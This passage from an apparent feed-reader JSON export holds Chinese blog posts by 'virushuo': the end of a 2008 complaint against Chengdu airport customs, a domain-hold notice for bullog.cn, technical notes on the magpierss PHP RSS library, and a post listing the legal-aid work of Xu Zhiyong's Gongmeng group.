海关工作人员在调查处理违法案件时，遇有下列情形之一的，应当回避：（一）是本案的当事人或者是当事人的近亲属；（二）本人或者其近亲属与本案有利害关系；（三）与本案当事人有其他关系，可能影响案件公正处理的。</p>\n\n<p>本人向成都海关法规处进行控告和检举成都机场海关违法违纪行为，但成都海关法规处没有为我保密，反而将我的联系方式告知当事人，违反了《中华人民共和国海关法》第八十条的有关规定。</p>\n\n<p>而被我举报的当事人竟然通知我到成都海关补办手续，未依法进行回避，违反了《中华人民共和国海关法》第八十一条的有关规定。</p>\n\n<p>作为中国公民，本人一向对海关公务员队伍充满好感，因为海关队伍可以算的上纪律最严明的公务员队伍之一。海关也是我国对外的窗口，承担了重要的使命。特别对于成都海关，自汶川大地震之后，振兴四川旅游业也是四川省委省政府的重要工作，到成都旅游，消费，就是支持四川重建。在这种背景下，发生本次事件更是令人遗憾。</p>\n\n<p>在汶川地震的抗震救灾中，我们为成都捐血捐物捐款，我们用各种方式支援灾区建设，然而，在震后我第一次到达四川，就遭遇到如此不公正的待遇，实在令人寒心。推而广之，其他过往，进入四川的国内国际旅客有没有碰到和我一样的遭遇？鉴于是海关工作人员，那么他们是如何对待国外旅客的？我们同机乘客有大量外籍人士，不知道他们当天在现场是什么感受。一些别有用心的国家经常攻击我国没有人权，非常令人气愤，而目前成都机场海关的行为是用实际行动为其背书，他们用实际行动对世界各国的旅客说：\"看看吧，我们就是没有人权。我们说没收就是没收，不用经过任何法律程序。\"</p>\n\n<p>作为四川省对外的窗口，成都海关的行为不仅违法，而且破坏了中国泱泱大国的国际形象，破坏了抗震救灾树立起的中国共产党的威信，破坏了我国海关清廉纪律严明的形象，也破坏了震后四川省政府所建立的政府形象。</p>\n\n<p>他们不仅应该承担法律责任，还应该对他们行为造成的恶劣政治影响和社会影响负责。他们必须对海关总署，对四川省委省政府，对进出四川的广大国内外旅客有一个合法合理的交代。</p>\n\n<p>基于以上事实，本人提出以下要求：</p>\n\n<p>1 依照《中华人民共和国海关办理行政处罚案件程序规定》，告知本人扣留理由，本人权利，并为本人开具扣留凭单，并送达本人。<br>\n2 成都机场海关处理此事人员应就以上违法行为对本人进行当面道歉。<br>\n3 成都海关应向本人提供就此事的整改意见，纠正执法人员的粗暴态度和不规范的行为。并加盖公章，以示真实。<br>\n4 成都海关应向本人提供对相关责任人违法行为的处理决定，并加盖公章，以示真实。<br>\n5 鉴于成都海关泄露举报人信息，并通过电话对举报人进行刁难和威胁，请海关总署依法对举报人进行保护，以避免本人进一步受到伤害。<br>\n6 即使经公安机关认定为管制刀具，予以没收，成都海关也应该退还本人刀具的包装等非违禁物品。<br>\n7 成都海关应支付本人为检举此事件所花费的通讯费等费用。</p>\n\n<p></p>\n\n<p>举报人:</p>\n\n<p>霍炬 </p>\n\n<p>联系方式：139110xxxxx</p>\n\n<p>2008/11/24</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370794802",
    "timestampUsec" : "1313370794802831",
    "id" : "tag:google.com,2005:reader/item/08f527818dcfe66e",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "不用cn域名以及不在国内注册域名的原因",
    "published" : 1231686689,
    "updated" : 1231951424,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2009/01/11/cn.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>最新的：摘录自 老罗 <a href=\"http://www.luoyonghao.net/blogs/luoyonghao/archives/122435.aspx\">罗永浩：我将若无其事地归来开放</a><br>\n-------------<br>\n您好！<br>\n <br>\n   北京市通管局下发北京市政府新闻办公室通知：www.bullog.cn站点大量登载时政类有害信息，已要求该网站整改，但该网站仍未采取有效整改措施。<br>\n <br>\n现需要万网记录停止该域名的访问权限；<br>\n <br>\n    HOLD域名bullog.cn；</p>\n\n<p>（原信如此，到上面的那个分号就没下文了）<br>\n-------------</p>\n\n<p></p>\n\n<p><br>\n</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370788528",
    "timestampUsec" : "1313370788528648",
    "id" : "tag:google.com,2005:reader/item/89d1f574715012f7",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "偶尔谈谈技术" ],
    "title" : "rss解析器magpierss笔记",
    "published" : 1237095081,
    "updated" : 1237095399,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2009/03/15/rssmagpierss.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><a href=\"http://magpierss.sourceforge.net/\">magpierss</a>是一个不错的rss抓取/解析工具，我本来打算自己写一个php的rss解析工具，不过试了一下magpierss，觉得还不错，能满足需要。</p>\n\n<p>顺便看了看代码，记点笔记。</p>\n\n<p>1 乱码问题<br>\nmagpierss过去时常出现乱码问题，从0.7版本解决了这个问题<br>\nVersion 0.7<br>\n-----------<br>\n    - support for input and output charset encoding<br>\n      based on the work in FoF, uses iconv or mbstring if available</p>\n\n<p>0.7之后的版本可以指定输入和输出字符编码，然后使用iconv或mbstring函数进行编码转换。这个工作在 create_parser 函数里面完成的，如果两个函数都不存在，可以在rss_fetch.inc 中让MAGPIE_DETECT_ENCODING为false，不检测和转换编码，否则就会出错。</p>\n\n<p>一切正常的情况下，把rss_fetch.inc中MAGPIE_OUTPUT_ENCODING定义成你需要的输出编码，比如UTF-8: define('MAGPIE_OUTPUT_ENCODING', 'UTF-8'); 就可以获得正确的输出结果了。</p>\n\n<p>2 抓取方法</p>\n\n<p>magpierss用了<a href=\"http://sourceforge.net/projects/snoopy/\">Snoopy</a>作为http客户端来抓取rss。这个库比较完善，支持https，支持gzip。</p>\n\n<p>需要注意的是，Snoopy用exec命令调用curl，然后返回结果，而不是使用编译进php的curl函数。默认的路径是\"/usr/bin/curl\"，如果这里没有curl或是没有执行权限，就可能失败。不过只有https需要用到curl，普通的http访问是用fsockopen的。</p>\n\n<p>同时，Snoopy可以使用代理服务器，但是magpierss没有使用，如果需要可以在rss_fetch.inc中的_fetch_remote_file函数里面添加$client-&gt;proxy_host 和$client-&gt;proxy_port。</p>\n\n<p>3 缓存</p>\n\n<p>magpierss设置了一个默认3600秒超时的缓存。在./cache下放了一堆文件，文件名是md5之后的url+MAGPIE_OUTPUT_ENCODING，格式是php的serialize。</p>\n\n<p>所以cache目录要可写。超时时间在rss_cache.inc的var $MAX_AGE    = 3600;这行设置，也可以在创建cache对象的时候设置。</p>\n\n<p><br>\n综合起来，这个库还是不错的，优点很多，也考虑了主机的各种情况，兼容性很好。函数形式的接口，很容易调用。不过应该先用head来取rss的http header，根据Etag来判断是否抓整个页面回来，这样效率还能再有提高。这个改动之后，cache就可以存在更长的时间，而不是一个固定的3600秒。同时我比较想把文章保存起来，以便以后用，这就需要数据库了。</p>\n\n<p>我将来应该会基于这个东西发布一个新版本，把我想要的功能加进来。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370773102",
    "timestampUsec" : "1313370773102668",
    "id" : "tag:google.com,2005:reader/item/721ecd4c426cb196",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "买了一本杂志和一份报纸",
    "published" : 1249563877,
    "updated" : 1249584034,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2009/08/06/post_67.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>某年某月某日之后，我决定blog上只写技术话题。再不写个人有关的任何事情。另外一个某年某月某日开始，作为一个环保主义者，我决定不买任何报纸和杂志，因为我觉得浪费资源，我看电子形式的东西已经足够了。甚至很多时候，别人赠送我的印刷品，我都会拒收。决定不买杂志的那个日子，到现在已经有10年了。中途极少破例。</p>\n\n<p>但今天，我破例同时买了一份杂志和一份报纸。于是，我也打算再破例一次，在blog上写一次非技术话题。</p>\n\n<p>这本杂志是《时尚先生》2009年8月号，报纸是《南方周末》8月6日。</p>\n\n<p>杂志，我是为了许志永这页而买。报纸则是为了A3版关于黑监狱的报道。</p>\n\n<p><img src=\"http://blog.devep.net/virushuo/upload/images/20090806.jpg\"><br>\n如果你理解，那么你应该明白我为什么会把这些东西买来作为收藏。如果你不能理解，那么请听我慢慢说清楚这件事吧。</p>\n\n<p>许志永博士是公盟创始人。公盟是一个法律援助公益组织。他们做过很多事，比如 ：2003年 就孙志刚案提起违宪审查建议，这件事最终取消了暂住证。如果你在2003年之前离开家乡，在另外一个城市工作，那么你很有可能和孙志刚一样，因为暂住证而莫名其妙丧了命。记得我刚来北京的时候，周围不时流传着\"<a href=\"http://www.google.com/search?client=safari&amp;rls=en-us&amp;q=%E5%88%B0%E6%98%8C%E5%B9%B3%E7%AD%9B%E6%B2%99%E5%AD%90&amp;ie=UTF-8&amp;oe=UTF-8\">到昌平筛沙子</a>\"的典故。感谢互联网，我们现在仍然可以找到\"筛沙子\"这个现在听起来好像小说一样的故事。在当时这可是笼罩在大家身边的实际威胁。</p>\n\n<p><br>\n概括点说，公盟做过的事情之中，一定有为你争取权益的，且不说大事，就说身边的事情，如果你在异地工作，如果你养狗，如果你家的房子要拆迁，如果你来自农村，如果你使用网通和电信的服务，如果你有孩子，如果你坐火车...就这几条大概就能涵盖所有人了吧。夸张一点来说的话，如果你纳税.... </p>\n\n<p>更为难得的是，许志永是个非常温和的人，始终提倡非暴力，一切都在法律范围内进行，一切合理合法，甚至到了被人打也不还手的地步。</p>\n\n<p>《时尚先生》的照片配的文字是许志永的梦想：\"<strong>我希望我们是个自由幸福的国家。每个人不需要违背良心，只要靠自己的才能和品德就可以找到合适的位置；一个简单而幸福的社会，人性的善得到最大的张扬，恶得到最大的抑制；诚实、信用、友爱、互助将成为我们生活的常态，没有那么多烦恼和愤怒，每一个人脸上是纯真的笑容。</strong>\"</p>\n\n<p>那么现在公盟怎么样呢？很遗憾，许志永博士刚刚被抓起来，关进了看守所，'公盟咨询有限责任公司'的下设机构'公盟法律研究中心'则被民政局宣布为非法组织。有时候我真想狠狠扇自己两个嘴巴，让自己从这个魔幻的超现实的荒谬的梦中醒来。不幸的是，这并非恶梦，而是现实。</p>\n\n<p>南周报道的这件事情我不想多说了。有兴趣的自己找来电子版看吧。</p>\n\n<p>著名专栏作者许知远(这两个人的名字时常被别人弄混)写了一篇相当感人的文章，《<a href=\"http://www.ftchinese.com/story.php?storyid=001027992\">我们这一代 </a>》 </p>\n\n<p>我能做的，只能去买一本正面宣传他的杂志，在blog上记录这件事，并试图告诉我blog的读者，这件事发生过。当然，我还会为公盟捐点微不足道的钱。</p>\n\n<p><br>\n写完了这篇，我的blog有可能被封。封就封了吧。天下何人不翻墙？</p>\n\n<p>对了，我还要推荐下<a href=\"http://blog.youxu.info/2009/08/05/aclu-early-days/\">这篇文章 </a></p>\n\n<p>无论结果如何，公盟做过的事情应该被我们铭记。 以下转载\"公盟\"曾经为我们每一个人做过的那些事情：</p>\n\n<p>2003年度<br>\n1、就孙志刚案提起违宪审查建议（2003年）<br>\n2003年南方都市报报道了孙志刚在收容遣送站被殴打致死的消息后，三位法学博士（公盟发起人）就收容遣送制度向全国人大常委会提起违宪审查的公民建议，在媒体和社会公众的共同努力下，两个月后国务院废止了收容遣送制度，一年后全国人大常委会成立了法规备案审查办公室。<br>\n2、孙大午案法律援助（2003年）<br>\n2003年7月，公盟的发起人张星水律师和许志永博士参与大午集团涉嫌非法吸收公众存款一案的辩护。社会各界的共同努力下，10月30日，孙大午先生被判缓刑，获得释放。<br>\n3、推动基层人大代表预选程序（2003年）<br>\n2003年10月，北京市各区开始进入人大代表选举预备阶段。许志永于11月正式宣布以独立候选人的身份参与北京市海淀区人大代表选举，经过其本人和助选团的不懈努力，最终当选为海淀区人大代表。</p>\n\n<p>2004年度<br>\n1、为《南方都市报》喻华峰和程益中辩护。（2004年）<br>\n2004年2月，为了声援媒体的良知和责任，许志永博士接受邀请作为《南方都市报》总经理喻华峰案的代理人之一。<br>\n2，参与代理承德四公民五次被判死刑案。（2004年）<br>\n2004年2月，许志永博士应吕宝祥律师之邀开始参与代理承德四公民冤案，四名被告人从1994年涉嫌抢劫出租车入狱先后被判处四次死刑。经过数次去承德周密调查，我们确认这四位公民是无辜的。公盟通过网络发布案卷材料，和众多有良知的新闻媒体一起表达对此案的关注。2004年3月26日，河北高院作出二审判决，分别判处四被告人死缓和无期。此后，开始了漫长的申诉过程。<br>\n3，对北京动物园搬迁的合法性组织研讨会提出质疑。（2004年）<br>\n2004年4月，媒体报道了北京市政府某部门提出准备将北京动物园搬迁到郊区。我们认为，北京动物园作为北京市民乃至全国人民的重要公益设施，其搬迁应作为北京的一件重大事项通过应有的公开的法律程序来决定，而不能由某部门私下做出决定。为此，我们联合环保组织\"绿家园\"组织了一场大型研讨会。6 月，建设部有关负责人表态，北京动物园不宜搬迁。<br>\n4，组织人大代表论坛（2004年）<br>\n2004年7月，在中国人大代表制度创立五十周年之际，公盟持续组织了六期\"我们是人民代表\"论坛。论坛邀请了部分海淀区人大代表和北京市人大代表讲述其参选人大代表以及履职的经历，分析人大制度，努力推动人大制度改革。<br>\n5、参与起草并向全国人大递交了宪法人权条款的修订建议<br>\n2004 年 1 月，我国即将第四次修订宪法之际，许志永、范亚峰、滕彪、秋风、王怡等法律学者共同起草完成了《完善我国宪法人权保护条款的建议》，提出了全面修改我国宪法人权保护条款使之形成了一个完整的人权保护体系的建议。并征集了贺卫方、秦晖等 30 位知名学者的联合签名。并举办了\"完善我国宪法人权保护条款\"的学术研讨会。<br>\n6、关注河南爱滋病村\"关爱之家\"孤儿院被政府强制关闭事件。</p>\n\n<p>2005年度<br>\n1、启动中国信访制度的研究（2005年）。<br>\n2005年初，公盟开始了对中国信访制度的研究。该项目目标在于通过全局性的总报告、地方分报告以及北京上访村的典型上访人的报告，向公众展现中国目前严重的上访现状以及上访者的悲惨人生，在现实调查的基础上提出建立基层民主制度的改革建议。许志永博士在调研过程中，通过公布上访人被接访人员殴打的亲身经历，提请了有关部门对上访人权益的关注，从2005年5月起，打人现象明显减少。<br>\n2、参与营救朱久虎律师（2005年）。<br>\n2005年5月，朱久虎律师因为代理陕北民营石油案得罪地方政府，被以扰乱公共秩序的罪名逮捕，滕彪博士、许志永博士与众多律师一起到陕北参与营救。在这个过程中，他们通过正常的法律途径、撰写陕北民营石油企业生存报告，以及媒体的宣传将朱久虎律师的遭遇公之于众。在多方努力之下，朱久虎律师无罪释放。<br>\n3、设立人大代表接待日，延续至今（2005年-2009年）。<br>\n2005年5月起，我们顺应海淀人大中的有利局势，每周四下午在办公室设立海淀区人大代表接待日，为海淀区选民服务。<br>\n4、人大制度研究。<br>\n为配合公盟在人大代表工作上的努力，建设了人大研究网，以此平台传播优秀的人大代表事迹、各级人大和村委会的竞选经验、选举制度与人大制度的理论探索等和人大相关的全方位的信息。并以此网站为平台协助下一次竞选中独立候选人参选。<br>\n5、撰写《中国人权发展报告》。<br>\n为了客观理性表述中国公民的宪法权利保障在过去一年取得的进步和存在的问题，提出改进的建议， 2005年度报告已经印发寄给政府有关部门，并通过网络发表。</p>\n\n<p>2006年度<br>\n1、继续为承德案提供法律援助并努力推动律师在场制度进入立法程序：<br>\n从2004年至今，对于河北承德案的法律援助一直没有中断。滕彪、李方平等律师组成的辩护团成员多次前往河北省高级法院与法官商谈该案的再审事宜，争取再审。2005年11月，辩护团发起了呼吁最高法院再审此案的法律人签名，截止于2006年7月，共征集到181位法律人的亲笔签名。2006年 3月，公盟成立了以赵国君、李玉洁、林峥为主要成员的关于确立\"律师在场权\"制度报告的项目小组。<br>\n2、完成2005年中国人权报告。<br>\n3、关注北京出租车提价和管理体制改革。<br>\n4、开设公盟评论。<br>\n从2006年4月开始，公盟网站增设了\"公盟评论\"栏目，该栏目针对社会普遍关心的热点问题，以评论特稿的形式在网站上刊登。\"公盟评论\"是公盟开展制度倡导活动的一个形式，体现了公盟一贯保有的温和、建设性地推进制度改革的行动立场。<br>\n5、福州陈信滔国家赔偿案。<br>\n2006年6月，公盟立项为福州陈信滔国家赔偿案提供法律援助，该案是有利于推动我国国家赔偿制度改革的一个典型案件。目前，该案正在起诉阶段。<br>\n6、完成中国信访问题研究报告。<br>\n公盟\"中国信访问题研究报告项目小组\"花费了大量时间在全国三个县和北京上访村进行实地调查研究，完成了近20万字的深入报告。在项目结束之际，公盟邀请到全国范围内关注信访问题的知名学者和政府官员，召开了一个大规模的信访专题研讨会。报告在学界范围内有了广泛的流传，影响了更多的公众关注访民这个特殊的群体以及中国信访问题的现状。<br>\n7、启动高校社团项目。<br>\n2006年8月--10月，公盟首次在高校中开展社团小额资助项目，鼓励更多关心中国问题的大学生参与到社会调研和制度建设的讨论中来。<br>\n8、关注2006年北京市海淀区人大代表直选：<br>\n2006年9月，公盟成立了\"关注2006年北京市区人大代表直选项目小组\"。该小组由李玉洁、蒲素等与高校志愿者组成。项目小组召集了北京市各区关注社区建设的业主委员会成员，开会讨论即将到来的选举，鼓励大家参选。10月，项目小组在各选区提名候选人之前，印刷了近400份由\"人大代表选举研究课题组\"编写的《选举指南》，以及许志永代表撰写的《致选民的一封信》，寄往全市357个小区业主委员会的主任。在寄出邮件后，陆续接到回馈电话咨询参选事宜。之后项目小组派出十多名志愿者为有意参选的市民助选，帮助他们发放宣传材料，征集居民联名推荐，观察确定正式候选人的程序，为候选人提供法律咨询。<br>\n9、关注打工子弟受教育权。<br>\n2006年12月，公盟着手开始对以北京为主的打工子弟学校的生存状况和法律保障问题进行的调查研究，力求在详细、深入地调研基础上提出切实有效的立法建议，从制度上保障新移民子女受教育的权利。目前，该项目计划由联合提出《关于慎重处理打工子弟学校问题的公民建议书》的公盟研究员李方平律师和胡星斗博士作为项目负责人。 这个项目的关注点在于城市新移民子女的受教育权利，涉及到教育制度、财政制度改革以及社会保障等社会公正的制度性问题。<br>\n10、关于修改《北京市养犬管理规定》的立法建议。<br>\n2006年12月，公盟开始关注在北京成为社区民众、养犬人与政府之间矛盾焦点的养犬问题。通过对现有法规和养犬人现状的调查研究，公盟起草提请北京市人大修改现行《北京市养犬管理规定》的立法建议。为了使立法建议具有充分的社会调查基础，公盟在12月8日组织了50名志愿者在北京主要城区的大型超市进行了1023份问卷调查，得出了一系列客观可靠的调查数据，指出在北京市城区养犬人比例高达27.8%，说明养犬问题不是一个小问题。通过电话、邮件等形式游说人大代表提出修改议案来改变现有法规中不合理条款。游说工作收到了意想不到的积极效果。</p>\n\n<p>2007年度<br>\n一、公盟援助个案<br>\n1、帮助黑砖窑受害人提起行政诉讼要求国家赔偿<br>\n2007年8月22日，受黑砖窑受害者陈小军和庞飞虎委托，在中国政法大学张树义教授工作室张亚东先生的帮助下，许志永和滕彪律师向山西省洪洞县人民法院递交了行政起诉状，起诉洪洞县公安机关行政不作为，要求就不作为带来的伤害给予黑砖窑受害人国家赔偿。2008年，公盟继续援助陈小军等人的刑事附带民事诉讼。<br>\n2、程海户籍诉讼案<br>\n2007年4月，程海律师先后将合肥市庐阳区公安分局和北京市昌平区公安分局告上法庭，要求两者为他办理自由迁移手续。现在诉讼在继续中，公盟为程海律师提供支持，并将结合户籍制度研究项目，2008年继续关注和研究公民自由迁徙权和户籍制度改革。<br>\n3、杨花秀为子鸣冤案<br>\n1996年10月6日，杨花秀子之程鹏被河南焦作市修武县公安局以涉嫌盗窃罪关押于修武县看守所，1997年9月25日死于看守所，当地公安机关在没有通知死者家属并且没有出具死亡鉴定书的情况下，雇佣一农民将尸体埋藏于当地河边的大树下，杨花秀找到尸体后要求追究相关人员责任并赔偿损失。公盟援助律师江天勇、李春富深入了解此案并多次前往案发地调查此案，不断向相关机关反映案情，但公检法机关不作为，案件进展缓慢。公盟将持续关注此案，为杨花秀提供法律援助。<br>\n4、陈信滔诉公安机关职务侵权民事赔偿案<br>\n2001年2月20日，福州发生了一起重大警匪勾结杀人抢劫案。公盟认为，福州市晋安分局参与本案的干警的行为是职务行为，分局应当与徐承平一起承担连带赔偿责任。该赔偿可以适用民法通则第121条关于职务侵权的规定。然而陈信滔的民事赔偿诉讼请求，从2007年4月2日陈信滔向福建省高院起诉至今，一直没有立案。<br>\n5、三死刑冤案：河北承德案，广东揭阳案，江西乐平案<br>\n公盟为三个死刑冤案中的十二位当事人提供法律援助。多位公盟律师赴广东、江西进行调查。我们也为这三个案件召开过题为\"冤案为什么得不到纠正\"的案件研讨会，对最高人民法院刑事案件再审机制的失灵进行了讨论，并整理出案件材料和证据寄给多位人大代表，请人大代表关注并帮助呼吁案件的重新调查。<br>\n二、公盟个案研讨会<br>\n1、钉子户事件与拆迁制度的法律问题研讨会，3月30日<br>\n2、冤案为什么得不到纠正----关于刑事错案再审机制的研讨会 ，6月9日<br>\n3、谁导致了孕妇的死亡----关于手术决定程序和责任承担法律问题研讨会，11月27日<br>\n三、公民参与行动<br>\n１、关注北京宋庄小产权房合同纠纷案并发布联名呼吁，提议让农民自由决定他们的土地交易和交易的对象，从而真正保护农民权利。<br>\n2、参与河北省南高和村村民不满京石高速路修建而发生的群体性事件，为村民呼吁，并得到保定市张石高速公路筹建处答复。<br>\n3、许志永作为海淀区人大代表，为海淀区博雅德园小区业主维权呼吁，最终维权成功 。<br>\n4、李方平、王利平律师\"要求查处电信、网通垄断行为\"，得到信息产业部书面答复。<br>\n5、就\"纸包子\"事件发表公开信，指出舆论封锁比假新闻更可怕。<br>\n6、关注济南暴雨后，网友因发布帖子说有人淹死但政府未公布而被拘留事件。<br>\n7、关注中关村拆迁案。北京市规划委员会以生造的\"规划意见书\"，取代法定的\"选址意见书\"和\"建设用地规划许可证\"。2004年11月16日，中关村科技城的居民龙新华提起行政诉讼，要求撤消《规划意见书》。公盟律师一直关注本案。<br>\n8、关注王粪堆死亡案。2007年8月4日早晨，4名河南籍公民在北京市崇文区左安门地区拾荒过程中被当地联防队员当成小偷追赶，其中两人被抓，一人逃跑，另一人失踪，失踪者王粪堆的尸体在左安门护城河里被发现。死者家属认为联防队对王粪堆的死亡负有不可推卸的责任，公盟对此案进行了调查并给与法律帮助。<br>\n四、法律研究<br>\n1、关于推动《公民权利与政治权利国际公约》的批准和履行项目<br>\n我国政府已于1998年签署该公约，但一直未经过全国人大常委会批准，该项目的目的是推动《公民权利与政治权利国际公约》的批准，提出相关法律法规的修改意见，推动中国的人权保障。该项目由周梅燕、王建勋、赵晓力、姚国建、许志永、滕彪等人执笔，研究报告已经完成。公盟于2008年1月把研究报告和呼吁批准该公约的信寄给众多全国人大代表。<br>\n2、关于推动北京改革\"户籍制度\"完善城市新移民准入制度项目<br>\n目前北京市在面对数量庞大的新移民时存在严重的制度缺失。该项目目标为促使北京市政府改革现行暂住证制度，使来到北京一定年限的新移民获得在社会保障、子女入学等方面的平等市民权利。该项目调查和研究工作已经完成。2008年公盟通过研讨和游说市人大代表继续推动该项目。<br>\n3、关于推动改革中国城市拆迁法律制度的项目<br>\n在《城市拆迁管理条例》废除之后，该项目的工作重点转移到《征收法》的起草上。该项目由杨支柱老师负责，计划在2008年5月末结项。<br>\n4、公民观察行动（http://www.gmguancha.org/）<br>\n公民观察是公盟基于公民立场通过监督政府履行职责推动政府廉洁、透明、高效、高质量服务的长期项目。观察项目主要集中在和公众生活比较密切的、公众比较关注的医疗、教育、环保、司法、廉政五等部门，主要工作方式是接受公民投诉，关注个案，必要时进行调查，通过人大代表监督或者公布调查报告的方式监督政府履行职责。<br>\n2007年关注问题包括翠湖湿地、六里屯垃圾场的建设、圆明园的环境保护、海淀公园的拆建问题，及打工子弟学校问题、农村合作医疗等问题的调查等。<br>\n五、公盟评论<br>\n全年公盟评论共发表《反对电信垄断暴利的公益之诉》、《坚决支持小产权房合法化》、《一个案件的真相与两个案件的正义》（关注\"聂树斌案\"）、《ATM机故障的无期徒刑与法官的堕落》等46篇文章。为公盟研究员对当期热点新闻话题和重大新闻事件发出的建设性理性声音。</p>\n\n<p>2008年<br>\n一、个案援助<br>\n1、 为三聚氰胺奶粉受害者做法律援助，提起共同诉讼（2008年）<br>\n2008年9月毒奶粉案曝出后，公盟迅速组织了由全国上百律师组成的志愿律师团，为受害消费者提供法律指导和服务。<br>\n10月中旬，公盟通过网络以及《南方周末》发出《公盟志愿律师为因食用含三聚氰胺奶粉而患病的消费者提供法律援助的公告》，并通过网络发出《公盟关于\"三聚氰胺\"奶粉受害者赔偿方案的建议》，并把此建议邮寄至卫生部、质检总局、国务院等部门，开始正式接受全国各地受害者的委托。<br>\n11月24日，援助律师前往石家庄，向三鹿集团递交了《关于解决三鹿\"三聚氰胺\"奶粉受害者赔偿事宜的律师函》、《三鹿\"三聚氰胺\"奶粉受害者赔偿方案律师建议书》以及一份援助律师已经接到委托的三鹿受害者名单。<br>\n11月25日，公盟和传知行社会经济研究所共同举办三聚氰胺奶粉受害者家庭与媒体、律师见面会。12月8日，公盟援助律师代表63名三鹿三聚氰胺奶粉的受害者正式向河北省高级人民法院提起共同诉讼。目前，公盟正在积极准备向其他奶粉企业提起诉讼。<br>\n2、杨佳袭警案二审调查（未获准）<br>\n9月8日，律师团成员刘晓原律师、李劲松律师、李苏滨律师、张建国律师、季化律师、程海律师与杨佳父亲等一道赴上海，取得一审判决书，但未被获准会见杨佳。9月9日，杨佳的姨妈王静荣在律师李方平陪同下，就北京市公安局朝阳分局在杨佳母亲王静梅失踪案上的不作为，向朝阳区人民法院提起行政诉讼。朝阳法院立案庭拒绝立案。10月26日，杨佳被执行死刑。<br>\n3、杜学雷案<br>\n2008年10月3日中午，杜学雷在河南省内黄县楚旺派出所被殴打致死。公盟志愿律师张兴奎、兰志学介入此案为杜学雷家属提供法律援助。10月下旬，此案受害者家属与公安机关达成民事调解协议。<br>\n4、甘锦华案<br>\n2004年10月12日晚，佛山市顺德区陈村镇大都村慈济精舍庵堂尼姑林某、周某二人被杀，经过调查，警方逮捕了当地村民甘锦华。甘锦华被判处死刑后，在临刑前喊冤，省高级法院组织重新审理。2008年11月6日，此案再审二审开庭，在这场关乎甘锦华生死的重要庭审中，滕彪担任甘锦华的辩护人，提出28出重要疑点以及刑讯逼供等问题。<br>\n4、承德陈国清案<br>\n5、福州陈信滔案<br>\n6、其他个案<br>\n◎2月19日，接到\"四川打工女火车上挤死\"的案件材料，联系死者家属为其提供了一些法律方面的咨询，并两次建议其坚持与铁路方面谈判。经过当事人家属与铁路多次协商，最终铁路方面把抚慰金提高到5万元。家属接受了此赔偿。<br>\n◎北京海淀区苏家坨地区163户拆迁户代表徐玉清向公盟反应回迁楼建设延期、周转金太低等问题。3月13日许志永写了\"人大代表建议\"寄往海淀区政府人大代表联络室。<br>\n◎海淀区四季青镇孙振环拆迁案、海淀区西洼村拆迁征地案。<br>\n◎河北省唐山市民黄玉秀反应其子廖海军被控故意杀害幼女，2003年法院在证据不足的情况下判处廖海军无期徒刑，黄玉秀及丈夫廖友以犯包庇罪均判处有期徒刑5年。案件可能涉及刑讯逼供、公安机关伪造证据等情况，公盟决定对此案给予法律援助。中华人民共和国最高人民法院口头通知此案已经立案。<br>\n◎对抗非法强拆的张薇、马秀兰聚众扰乱社会秩序案。<br>\n◎公民黄勇因对政府养犬管理部门蛮横打狗限小发表言论、进行表达而被关押、起诉，为维护公民合法言论表达自由，我们无偿援助黄勇并进行了无罪辩护。目前案件已审结，我们的工作获得了当事人的充分肯定。<br>\n◎于博诉清华大学培训合同纠纷案。<br>\n◎上访公民单亚娟被黑监狱暴力人员打伤后，在积水潭医院诊断，结果为\"陈旧性骨折\"，与其他多家医院多次诊断结论相反，导致其故意伤害案无法成立。为此单亚娟将北京积水潭医院诉至法院，目前正在二审审理中。<br>\n二、公盟个案研讨会<br>\n◎公盟个案研讨会----由辽宁县委书记进京刑拘北京记者说起，1月10日。<br>\n◎城管制度反思----从城管杀人案谈起，1月10日。<br>\n◎2005--2007中国新闻自由度研究报告研讨会，3月2日。<br>\n◎ 维护灾区稳定法律问题研讨会，5月31日，与检察日报•正义网合办。<br>\n◎拆迁现实问题与征收法立法研讨会，6月1日。<br>\n◎ 网络言论自由----从杜冬劲诉上海电信案说起，6月21日。<br>\n◎ 政府信息公开的困境与突破研讨会，6月25日。<br>\n◎ 